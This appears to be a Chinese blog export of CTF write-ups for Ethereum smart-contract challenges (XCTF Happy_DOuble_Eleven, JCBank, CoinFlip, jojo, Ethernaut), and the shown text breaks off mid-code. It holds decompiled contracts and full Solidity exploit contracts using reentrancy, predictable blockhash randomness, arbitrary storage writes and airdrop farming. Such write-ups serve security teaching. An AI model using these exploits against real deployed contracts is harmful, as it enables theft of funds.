    <content type="text"><![CDATA[前言 前两天设计了一个区块链的题目，其中出现了很多问题，还好在比赛第一天夜里修复了问题，在这里简单记录一下，给各位师傅带来了麻烦，表示歉意（emmm），下面先说明一下每个版本都修复了什么问题 第一个版本我就是头脑发热，把题目设计成 1000 eth 就能拿到 flag ，我真是弟弟行为，还好及时下线 第二个版本是任意地址写条件没有控制的很苛刻，导致天枢利用了这一点，在非预期做出题目之后，把 codex 的 length 给修改成了一个相对小的数值，造成其他队伍没法做题，这一点被有心之人利用了，他们写了个脚本一直攻击刚部署上的合约，修改数组长度（23333，硬生生被玩成了AD） 第三个版本是修复了版本二的问题，应该是可以正常做题的 后来仔细思考了一下，版本三还是有一些问题的，不过选手做题的时候没有遇到，但是担心会出问题，所以就有了最终版本四（其实版本四也有一些问题，在 buy() 中有一条 require(storage[0x02]==1) 限制，虽然在 payforflag 后会回到初始化状态，但是这里头铁使用了 storage 变量，导致一个问题是如果正在解题的队伍使这个条件成立了，恰巧另外一支队伍也正在解题，那么他们就可以乘顺风车，如果这里使用 memory 变量就好了 变更了版本其实主要还是想要让题目按照预期进行求解，给各个队伍造成了麻烦，表示抱歉（2333333…..），下面介绍一下题目 以太坊 Ropsten 测试链 合约地址：https://ropsten.etherscan.io/address/0x168892cb672a747f193eb4aca7b964bfb0aa6476 题目：https://github.com/hitcxy/challenges/tree/master/2019/Happy_DOuble_Eleven EVM 逆向 先进行合约逆向，使用 https://ethervm.io/decompile 可以逆向出下面几个关键 function 0x6bc344bc payforflag(string) 要求 msg.sender == storage[0x00] 要求 msg.sender 后 12 位为 0x111 要求 storage[0x06] == 0x03 要求 storage[0x05] &gt; 0x8ac7230489e80000 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273function payforflag(var arg0) &#123; if (msg.sender != storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff) &#123; revert(memory[0x00:0x00]); &#125; if (msg.sender &amp; 0x0fff != 0x0111) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; if (storage[keccak256(memory[0x00:0x40])] != 0x03) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] &lt;= 0x8ac7230489e80000) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x04; storage[keccak256(memory[0x00:0x40])] = 0x00; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; storage[keccak256(memory[0x00:0x40])] = 0x00; storage[0x02] = (storage[0x02] &amp; ~0xff) | 0x00; storage[0x00] = (storage[0x00] &amp; ~(0xff * 0x0100 ** 0x14)) | 0x00; var var0 = 0x00; var var1 = 0x0eed; var var3 = var0; var var2 = 0x01; func_1489(var2, var3); var0 = 0x296b9274d26b7baffb5cc93e1af19012c35ace27ba9acf1badff99d1f76dfa69; var temp0 = arg0; var1 = temp0; var temp1 = memory[0x40:0x60]; var2 = temp1; var3 = var2; var temp2 = var3 + 0x20; memory[var3:var3 + 0x20] = temp2 - var3; memory[temp2:temp2 + 0x20] = memory[var1:var1 + 0x20]; var var4 = temp2 + 0x20; var var6 = memory[var1:var1 + 0x20]; var var5 = var1 + 0x20; var var7 = var6; var var8 = var4; var var9 = var5; var var10 = 0x00; if (var10 &gt;= var7) &#123; label_0F50: var temp3 = var6; var4 = temp3 + var4; var5 = temp3 &amp; 0x1f; if (!var5) &#123; var temp4 = memory[0x40:0x60]; log(memory[temp4:temp4 + var4 - temp4], [stack[-6]]); return; &#125; else &#123; var temp5 = var5; var temp6 = var4 - temp5; memory[temp6:temp6 + 0x20] = ~(0x0100 ** (0x20 - temp5) - 0x01) &amp; memory[temp6:temp6 + 0x20]; var temp7 = memory[0x40:0x60]; log(memory[temp7:temp7 + (temp6 + 0x20) - temp7], [stack[-6]]); return; &#125; &#125; else &#123; label_0F3E: var temp8 = var10; memory[var8 + temp8:var8 + temp8 + 0x20] = memory[var9 + temp8:var9 + temp8 + 0x20]; var10 = temp8 + 0x20; if (var10 &gt;= var7) &#123; goto label_0F50; &#125; else &#123; goto label_0F3E; &#125; &#125;&#125; 0xed21248c Deposit() 每次 msg.value &gt;= 0x1b1ae4d6e2ef500000 ，即 msg.value &gt;= 500 eth ，然后 storage[0x05] += 1 结合 payforflag 来看，这个操作不现实，因为 payforflag 中要求 storage[0x05] &gt; 0x8ac7230489e80000 ，即要将 msg.value &gt;= 500 eth 进行 0x8ac7230489e80000+1 次 12345678function Deposit() &#123; if (msg.value &lt; 0x1b1ae4d6e2ef500000) &#123; return; &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; var temp0 = keccak256(memory[0x00:0x40]); storage[temp0] = storage[temp0] + 0x01;&#125; 0x24b04905 gift() 要求 address(msg.sender).code.length == 0 ，即在合约 constructor 中运行即可 要求 msg.sender 后 12 位为 0x0111 满足上述条件后，storage[0x04] = 100 ， storage[0x05] += 1 ， storage[0x06] += 1 123456789101112131415161718192021222324function gift() &#123; var var0 = address(msg.sender).code.length; if (var0 != 0x00) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] != 0x00) &#123; revert(memory[0x00:0x00]); &#125; if (msg.sender &amp; 0x0fff != 0x0111) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x04; storage[keccak256(memory[0x00:0x40])] = 0x64; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; var temp0 = keccak256(memory[0x00:0x40]); storage[temp0] = storage[temp0] + 0x01; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; var temp1 = keccak256(memory[0x00:0x40]); storage[temp1] = storage[temp1] + 0x01; &#125; 0x23de8635 func_06CE(arg0) 这里是调用了 0xa8286aca 的 function 总体来看，这里调用了 0xa8286aca 两次，输入同样的参数 arg0 一次， 0xa8286aca 第一次和第二次返回的结果不一样，但是一个 function 当它的参数确定时，他的返回结果也应该是确定的，而不会两次不一样，所以 0xa8286aca 这里应该是一个接口函数，我们是可以改写的，最后改变了 storage[0x02] 的值 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475function func_06CE(var arg0) &#123; var var0 = msg.sender; var var1 = var0 &amp; 0xffffffffffffffffffffffffffffffffffffffff; var var2 = 0xa8286aca; var temp0 = memory[0x40:0x60]; memory[temp0:temp0 + 0x20] = (var2 &amp; 0xffffffff) * 0x0100000000000000000000000000000000000000000000000000000000; var temp1 = temp0 + 0x04; memory[temp1:temp1 + 0x20] = arg0; var var3 = temp1 + 0x20; var var4 = 0x20; var var5 = memory[0x40:0x60]; var var6 = var3 - var5; var var7 = var5; var var8 = 0x00; var var9 = var1; var var10 = !address(var9).code.length; if (var10) &#123; revert(memory[0x00:0x00]); &#125; var temp2; temp2, memory[var5:var5 + var4] = address(var9).call.gas(msg.gas).value(var8)(memory[var7:var7 + var6]); var4 = !temp2; if (!var4) &#123; var1 = memory[0x40:0x60]; var2 = returndata.length; if (var2 &lt; 0x20) &#123; revert(memory[0x00:0x00]); &#125; if (memory[var1:var1 + 0x20]) &#123; label_0850: return; &#125; else &#123; storage[0x03] = arg0; var1 = var0 &amp; 0xffffffffffffffffffffffffffffffffffffffff; var2 = 0xa8286aca; var temp3 = memory[0x40:0x60]; memory[temp3:temp3 + 0x20] = (var2 &amp; 0xffffffff) * 0x0100000000000000000000000000000000000000000000000000000000; var temp4 = temp3 + 0x04; memory[temp4:temp4 + 0x20] = storage[0x03]; var3 = temp4 + 0x20; var4 = 0x20; var5 = memory[0x40:0x60]; var6 = var3 - var5; var7 = var5; var8 = 0x00; var9 = var1; var10 = !address(var9).code.length; if (var10) &#123; revert(memory[0x00:0x00]); &#125; var temp5; temp5, memory[var5:var5 + var4] = address(var9).call.gas(msg.gas).value(var8)(memory[var7:var7 + var6]); var4 = !temp5; if (!var4) &#123; var1 = memory[0x40:0x60]; var2 = returndata.length; if (var2 &lt; 0x20) &#123; revert(memory[0x00:0x00]); &#125; storage[0x02] = !!memory[var1:var1 + 0x20] | (storage[0x02] &amp; ~0xff); goto label_0850; &#125; else &#123; var temp6 = returndata.length; memory[0x00:0x00 + temp6] = returndata[0x00:0x00 + temp6]; revert(memory[0x00:0x00 + returndata.length]); &#125; &#125; &#125; else &#123; var temp7 = returndata.length; memory[0x00:0x00 + temp7] = returndata[0x00:0x00 + temp7]; revert(memory[0x00:0x00 + returndata.length]); &#125;&#125; 0x9189fec1 guess(uint256) 要求 arg0 == block.blockHash(block.number - 0x01) % 3 ，这个很容易满足，因为利用区块号生成的随机数是可预测的 满足要求后，storage[0x00] = (storage[0x00] &amp; ~(0xff * 0x0100 ** 0x14)) | 0x0100 ** 0x14 ，即 storage[0x00] 的高 96 位数值为1 1234567891011121314function guess(var arg0) &#123; var var1 = 0x00; var var0 = block.blockHash(block.number - 0x01); var var2 = 0x03; var var3 = var0; if (!var2) &#123; assert(); &#125; var1 = var3 % var2; if (var1 != arg0) &#123; return; &#125; storage[0x00] = (storage[0x00] &amp; ~(0xff * 0x0100 ** 0x14)) | 0x0100 ** 0x14;&#125; 0xa6f2ae3a buy() 要求 storage[0x06] == 1 ，这些调用 gift() 空投可以完成 要求 storage[0x05] == 1 ，这些调用 gift() 空投可以完成 要求 storage[02] == 1 ，结合 func_06CE 来看，只需使得 0xa8286aca 第二次调用返回 1 即可 要求 storage[0x00] / 0x0100 ** 0x14 &amp; 0xff == 1 ，即 storage[0x00] 的高 96 位数值要求为 1 ，这个满足 guess 即可 满足上述要求后，storage[0x05] += 1 ，storage[0x06] += 1 123456789101112131415161718192021222324function buy() &#123; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; if (storage[keccak256(memory[0x00:0x40])] != 0x01) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] != 0x01) &#123; revert(memory[0x00:0x00]); &#125; if (!!(storage[0x02] &amp; 0xff) != !!0x01) &#123; revert(memory[0x00:0x00]); &#125; if (!!(storage[0x00] / 0x0100 ** 0x14 &amp; 0xff) != !!0x01) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; var temp0 = keccak256(memory[0x00:0x40]); storage[temp0] = storage[temp0] + 0x01; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; var temp1 = keccak256(memory[0x00:0x40]); storage[temp1] = storage[temp1] + 0x01;&#125; 0x47f57b32 retract() 要求 storage[0x01] == 0 要求 storage[0x05] == 0x02 ，调用 gift 后，再调用 buy 即可 要求 storage[0x06] == 0x02 ，调用 gift 后，再调用 buy 即可 要求 storage[0x00] / 0x0100 ** 0x14 &amp; 0xff == 0x01 ，即 storage[0x00] 的高 96 位数值要求为 1 ，这个满足 guess 即可 满足上述要求之后，storage[0x01] -= 0x1 ，这里应该是修改数组的长度 123456789101112131415161718192021function retract() &#123; if (storage[0x01] != 0x00) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] != 0x02) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; if (storage[keccak256(memory[0x00:0x40])] != 0x02) &#123; revert(memory[0x00:0x00]); &#125; if (!!(storage[0x00] / 0x0100 ** 0x14 &amp; 0xff) != !!0x01) &#123; revert(memory[0x00:0x00]); &#125; var var0 = storage[0x01] - 0x01; var var1 = 0x0cf4; var var2 = 0x01; var var3 = var0; func_1489(var2, var3);&#125; 0x0339f300 revise(uint256,bytes32) 要求 storage[0x01] &gt;= 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000 ，经过 retract() 后即可满足 要求 storage[0x05] == 0x02 ， 要求 storage[0x06] == 0x02 ， 要求 storage[0x00] / 0x0100 ** 0x14 &amp; 0xff == 0x01 ，即 storage[0x00] 的高 96 位数值要求为 1 ，这个满足 guess 即可 要求 arg0 &gt;= storage[0x01] 满足上述要求后，后面进行了 storage 写操作，这里是任意写操作 123456789101112131415161718192021222324252627282930313233343536373839function revise(var arg0, var arg1) &#123; if (storage[0x01] &lt; 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] != 0x02) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; if (storage[keccak256(memory[0x00:0x40])] != 0x02) &#123; revert(memory[0x00:0x00]); &#125; if (!!(storage[0x00] / 0x0100 ** 0x14 &amp; 0xff) != !!0x01) &#123; revert(memory[0x00:0x00]); &#125; var var0 = arg1; var var1 = 0x01; var var2 = arg0; if (var2 &gt;= storage[var1]) &#123; assert(); &#125; memory[0x00:0x20] = var1; storage[keccak256(memory[0x00:0x20]) + var2] = var0; if (storage[0x01] &gt;= 0xffffffffff000000000000000000000000000000000000000000000000000000) &#123; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; var temp0 = keccak256(memory[0x00:0x40]); storage[temp0] = storage[temp0] + 0x01; return; &#125; else &#123; var0 = 0x00; var1 = 0x0676; var2 = 0x01; var var3 = var0; func_1489(var2, var3); revert(memory[0x00:0x00]); &#125;&#125; 0xa9059cbb transfer(address,uint256) 这里是进行 storage[0x04] 之间的转账操作 123456789function transfer(var arg0, var arg1) returns (var r0) &#123; var var0 = 0x00; var var1 = 0x11d7; var var2 = msg.sender; var var3 = arg0; var var4 = arg1; func_126F(var2, var3, var4); return 0x01;&#125; 0x2e1a7d4d withdraw(uint256) 要求 storage[0x05] == 0x02 要求 storage[0x06] == 0x03 要求退款每次 &lt; 100 要求 storage[0x04] &lt; arg0，即余额比每次退款要多 要求合约余额比退款要多 满足条件后，storage[0x04] -= arg0 ，然后调用 call 函数进行转账（这里存在重入攻击，因为没有对 gas 做控制），最后 storage[0x05] -= 0x01 12345678910111213141516171819202122232425262728293031323334function withdraw(var arg0) &#123; if (msg.sender != storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; if (storage[keccak256(memory[0x00:0x40])] != 0x02) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x06; if (storage[keccak256(memory[0x00:0x40])] != 0x03) &#123; revert(memory[0x00:0x00]); &#125; if (arg0 &lt; 0x64) &#123; revert(memory[0x00:0x00]); &#125; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x04; if (storage[keccak256(memory[0x00:0x40])] &lt; arg0) &#123; revert(memory[0x00:0x00]); &#125; if (address(address(this)).balance &lt; arg0) &#123; revert(memory[0x00:0x00]); &#125; var temp0 = arg0; memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x04; var temp1 = keccak256(memory[0x00:0x40]); storage[temp1] = storage[temp1] - temp0; var temp2 = memory[0x40:0x60]; memory[temp2:temp2 + 0x00] = address(msg.sender).call.gas(msg.gas).value(temp0)(memory[temp2:temp2 + memory[0x40:0x60] - temp2]); memory[0x00:0x20] = msg.sender; memory[0x20:0x40] = 0x05; var temp3 = keccak256(memory[0x00:0x40]); storage[temp3] = storage[temp3] - 0x01;&#125; 分析 通过上面的分析后，这样整个攻击链就出来了 生成符合要求的外部账户，在 constructor 中调用 gift() 调用 0x23de8635 func_06CE ，这里要利用 bytecode 的方式部署，因为我们不知道 func_06CE 中调用的接口函数 0xa8286aca 的函数名，所以利用 bytecode 的方式部署第三方合约，将 fake(uint256) 对应的函数选择 id 改为 0xa8286aca 即可，这样调用 0xa8286aca 就是调用我们重写之后的 0xa8286aca 了，用 bytecode 部署可以用在线的 myetherwallet.com 调用 guess() ，然后调用 buy() 调用 retract() 和 revise() 修改 owner 部署第三方子合约，第三方子合约调用 gift() 和 transfer() 给攻击合约转账，然后调用 withdraw() 进行重入攻击 最后调用 payforflag 即可 exp 外部账户满足其部署的第一个合约地址最后 12 位是 0x111 可以用下述脚本生成，generate_eoa1() 是生成外部账户最后 12 位为 0x111 ，generate_eoa2() 是生成满足外部账户部署的第一个合约最后 12 位是 0x111 ，我们用 generate_eoa2() 即可 1234567891011121314151617181920212223242526272829303132333435from ethereum import utilsimport os, sys# generate EOA with appendix 1b1bdef generate_eoa1(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not addr.lower().endswith("111"): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))# generate EOA with the ability to deploy contract with appendix 1b1bdef generate_eoa2(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not utils.decode_addr(utils.mk_contract_address(addr, 0)).endswith("111"): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))if __name__ == "__main__": if sys.argv[1] == "1": generate_eoa1() elif sys.argv[1] == "2": generate_eoa2() else: print("Please enter valid argument") exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172pragma solidity ^0.4.23;contract hack &#123; address instance_address = 0x168892cb672a747f193eb4aca7b964bfb0aa6476; uint have_withdraw = 0; int cnt = 0; constructor() payable &#123; // gift() address(instance_address).call(bytes4(0x24b04905)); &#125; function step1() public &#123; // storage[0x02] == 1 address(instance_address).call(bytes4(0x23de8635), 0); &#125; function fake(uint256 _i) public returns(uint256) &#123; if(cnt == 1) &#123; return 1; &#125; cnt = 1; return 0; &#125; function step2() public &#123; // guess(uint256) uint256 v = uint256(block.blockhash(block.number-1)) % 3; address(instance_address).call(bytes4(0x9189fec1), v); // buy() address(instance_address).call(bytes4(0xa6f2ae3a)); &#125; function step3() public &#123; // retract() assert(address(instance_address).call(bytes4(0x47f57b32))); &#125; function step4() public &#123; // revise(uint256,bytes32) uint256 solt = 2**256-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6; address(instance_address).call(bytes4(0x0339f300), solt, 2**160 + uint256(address(this))); &#125; function step5() public &#123; // withdraw address(instance_address).call(bytes4(0x2e1a7d4d), 100); &#125; function() payable &#123; if (have_withdraw &lt;=2 &amp;&amp; msg.sender == instance_address) &#123; have_withdraw += 1; address(instance_address).call(bytes4(0x2e1a7d4d), 100); &#125; &#125; function step6(string b64email) public &#123; address(instance_address).call(bytes4(0x6bc344bc), b64email); &#125;&#125;contract son &#123; address instance_address = 0x168892cb672a747f193eb4aca7b964bfb0aa6476; constructor() payable &#123; // gift() address(instance_address).call(bytes4(0x24b04905)); // transfer address(instance_address).call(bytes4(0xa9059cbb), address(0x2db8f907965a5742f16f82cddced585f8bc04111), 100); &#125;&#125;]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>xctf final</tag>
        <tag>Happy_DOuble_Eleven</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hackergame2019 JCBank]]></title>
    <url>%2F2019%2FJCBank%2F</url>
    <content type="text"><![CDATA[前言 以太坊 Kovan 测试链 合约地址：https://kovan.etherscan.io/address/0xE575c9abD35Fa94F1949f7d559056bB66FddEB51 题目：https://github.com/hitcxy/challenges/tree/master/2019/Hackergame2019_JCBank 两个 flag : get_flag_1 get_flag_2 get_flag_1 读取 storage 变量 secret 的值即可，其值为 0x175bddc0da1bd47369c47861f48c8ac ，调用 get_flag_1 即可 1234567891011var Web3=require("web3");if (typeof web3 !== 'undefined') &#123; web3 = new Web3(web3.currentProvider);&#125; else &#123; web3 = new Web3(new Web3.providers.HttpProvider("https://kovan.infura.io/v3/b38f10b5036f4e6691fcc690461097d1"));&#125;var address="0xE575c9abD35Fa94F1949f7d559056bB66FddEB51";web3.eth.getStorageAt(address, 0, function(x,y)&#123;console.info(y)&#125;);web3.eth.getStorageAt(address, 1, function(x,y)&#123;console.info(y)&#125;);web3.eth.getStorageAt(address, 2, function(x,y)&#123;console.info(y)&#125;); get_flag_2 利用 Reentrancy 和 整型下溢 123456789101112131415161718192021222324252627282930313233contract hack &#123; address instance_address = 0xE575c9abD35Fa94F1949f7d559056bB66FddEB51; JCBank target = JCBank(instance_address); uint public have_withdraw = 0; string public s; constructor() public payable &#123;&#125; function attack() public &#123; target.deposit.value(0.1 ether)(); &#125; function attack1(uint128 guess) public &#123; s=target.get_flag_1(guess); &#125; function attack2() public &#123; if(have_withdraw == 1)&#123; target.get_flag_2(155418233698); &#125; &#125; function attack3() public &#123; target.withdraw(0.1 ether); &#125; function() payable &#123; if (have_withdraw == 0 &amp;&amp; msg.sender == instance_address)&#123; have_withdraw = 1; target.withdraw(0.1 ether); &#125; &#125;&#125; attack 存入一点金额，attack3 重入攻击两次， attack2 调用 get_flag_2 即可]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Hackergame</tag>
        <tag>JCBank</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RoarCTF2019 CoinFlip]]></title>
    <url>%2F2019%2FCoinFlip%2F</url>
    <content type="text"><![CDATA[前言 RoarCTF2019 的 CoinFlip 题目 题目：https://github.com/hitcxy/challenges/tree/master/2019/RoarCTF2019_CoinFlip Deposit() 可以增加 balances[msg.sender] ，但是需要发送 msg.value &gt; 500 ether 才能满足要求，可以写自动化脚本完成（但这样的话，题目应该是非预期，题目考点应该不是这个，所以理论可行，请自行尝试） 薅羊毛攻击: 部署第三方自合约，然后调用 Ap() 和 Transfer() 将钱转到固定地址 固定地址调用 CaptureTheFlag 即可 12345678910111213141516171819202122232425contract hack &#123; address instance_address = 0xF60ADeF7812214eBC746309ccb590A5dBd70fc21; P_Bank target = P_Bank(instance_address); function hack1(string b64email) public &#123; target.CaptureTheFlag(b64email); &#125;&#125;contract father &#123; function createsons() &#123; for (uint i=0;i&lt;101;i++) &#123; son ason = new son(); &#125; &#125;&#125;contract son &#123; constructor() public &#123; P_Bank tmp = P_Bank(0xF60ADeF7812214eBC746309ccb590A5dBd70fc21); tmp.Ap(); tmp.Transfer(0x7ec9f720a8d59bc202490c690139f8c7cbad568d, 1 ether); &#125;&#125;]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>RoarCTF2019</tag>
        <tag>CoinFlip</tag>
        <tag>Blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数字经济2019 jojo]]></title>
    <url>%2F2019%2Fjojo%2F</url>
    <content type="text"><![CDATA[前言 数字经济云安全众测大赛 2019 ，一道区块链题目 题目：https://github.com/hitcxy/challenges/tree/master/2019/szjj_jojo 需要逆向 满足 require 即可 1234function payforflag(string b64email) public &#123; require(balanceOf[msg.sender] &gt;= 100000); emit SendFlag(b64email);&#125; gift 空投函数 12345function gift() public &#123; assert(gift[msg.sender]==0); balanceOf[msg.sender]+=100; gift[msg.sender]=1;&#125; 转账函数 12345function transfer(address to,uint value) public &#123; assert(balanceOf[msg.sender] &gt;= value); balanceOf[msg.sender]-=value; balanceOf[to]+=value;&#125; 转账函数无法整型溢出，所以需要另想办法 薅羊毛攻击：通过建立多个自合约领取空投，然后转账给固定账户即可完成攻击 payforflag 12345678910111213141516171819202122232425contract hack &#123; address instance_address = 0xd86ed76112295a07c675974995b9805912282eb3; jojo target = jojo(instance_address); function hack1(string b64email) public &#123; target.payforflag(b64email); &#125;&#125;contract father &#123; function attack() public &#123; for (uint i=0; i&lt;50; i++) &#123; son ason = new son(); &#125; &#125;&#125;contract son &#123; constructor() public&#123; jojo tmp = jojo(0xd86ed76112295a07c675974995b9805912282eb3); tmp.gift(); tmp.transfer(0xafFE1Eeea46Ec23a87C7894d90Aa714552468cAF,100); &#125;&#125;]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Solidity</tag>
        <tag>数字经济云安全</tag>
        <tag>Smart Contract</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ethernaut -- Smart Contract]]></title>
    <url>%2F2019%2Fethernaut%2F</url>
    <content type="text"><![CDATA[前言 22 shop 这题貌似已经下线，嘤嘤嘤嘤 记录一下刚学习 Smart Contract 做题的平台的 WP （2333入门级，开心就好～～～），如果没有任何基础，可以参考 CryptoZombies 等教程，下面是题目平台地址： https://ethernaut.openzeppelin.com/ Hello Ethernaut 熟悉关卡挑战的模式，以及执行操作的方式，根据其介绍一步一步操作即可 由于网络不太稳定的原因，可以多试几次，成功的结果花里胡哨的23333 FallbackRequire you claim ownership of the contract you reduce its balance to 0 Source1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract Fallback is Ownable &#123; using SafeMath for uint256; mapping(address =&gt; uint) public contributions; function Fallback() public &#123; contributions[msg.sender] = 1000 * (1 ether); &#125; function contribute() public payable &#123; require(msg.value &lt; 0.001 ether); contributions[msg.sender] = contributions[msg.sender].add(msg.value); if(contributions[msg.sender] &gt; contributions[owner]) &#123; owner = msg.sender; &#125; &#125; function getContribution() public view returns (uint) &#123; return contributions[msg.sender]; &#125; function withdraw() public onlyOwner &#123; owner.transfer(this.balance); &#125; function() payable public &#123; require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0); owner = msg.sender; &#125;&#125; Analyse 合约可以有一个未命名的函数。这个函数不能有参数也不能有返回值。 如果在一个到合约的调用中，没有其他函数与给定的函数标识匹配（或没有提供调用数据），那么这个函数（ fallback 函数）会被执行。除此之外，每当合约收到以太币（没有任何数据），这个函数就会执行。此外，为了接收以太币， fallback 函数必须标记为 payable 。 很明显我们如果通过反复调用 contribute 来触发 owner 不现实，因为我们每次最多向合约贡献不大于 0.001 ether ，而要超过 owner 需要 1000 ether （构造函数赋予 owner 的）。但我们惊喜地发现 fallback 函数同样可以改变 owner 的值，那么对应的操作就非常清晰了： 调用合约的 contribute 使得合约中我们账户对应的 balance 大于 0 触发 fallback 函数使得合约对应的 owner 变成我们 调用 withdraw 函数清空 balance Solution12345678// step 1await contract.contribute(&#123;value: 1&#125;);// step 2，使用 sendTransaction 函数触发 fallback 函数执行await contract.sendTransaction(&#123;value: 1&#125;);// step 3await contract.withdraw();// 此时调用 owner 函数可以确认合约的 owner 是否已经变成了我们所对应的地址了await contract.owner(); FalloutRequire Claim ownership of the contract below to complete this level. Source123456789101112131415161718192021222324252627282930313233pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract Fallout is Ownable &#123; using SafeMath for uint256; mapping (address =&gt; uint) allocations; /* constructor */ function Fal1out() public payable &#123; owner = msg.sender; allocations[owner] = msg.value; &#125; function allocate() public payable &#123; allocations[msg.sender] = allocations[msg.sender].add(msg.value); &#125; function sendAllocation(address allocator) public &#123; require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); &#125; function collectAllocations() public onlyOwner &#123; msg.sender.transfer(this.balance); &#125; function allocatorBalance(address allocator) public view returns (uint) &#123; return allocations[allocator]; &#125;&#125; Analyse 我们可以发现一个很明显的问题，理论上应该写成 Fallout 的构造函数被写成了 Fal1out ，那么该函数就不是构造函数，意味着该函数可以被我们调用（我们无法调用构造函数）。 Solution1234// 调用该函数，修改 ownerawait contract.Fal1out();// 可以确认是否修改成功await contract.owner(); Coin FlipRequire This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you&#39;ll need to use your psychic abilities to guess the correct outcome 10 times in a row. Source1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.18;import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract CoinFlip &#123; using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number.sub(1))); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125; Analyse 代码处理流程为： 获得上一块的 hash 值 判断与之前保存的 hash 值是否相等，相等则会退 根据 blockValue/FACTOR 的值判断为正或负，即通过 hash 的首位判断 以太坊区块链上的所有交易都是确定性的状态转换操作，每笔交易都会改变以太坊生态系统的全球状态，并且是以一种可计算的方式进行，这意味着其没有任何的不确定性。所以在区块链生态系统内，不存在熵或随机性的来源。如果使用可以被挖矿的矿工所控制的变量，如区块哈希值，时间戳，区块高低或是 Gas 上限等作为随机数的熵源，产生的随机数并不安全。 Solution12345678910111213141516171819202122232425262728293031323334353637383940414243444546pragma solidity ^0.4.18;contract CoinFlip &#123; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; 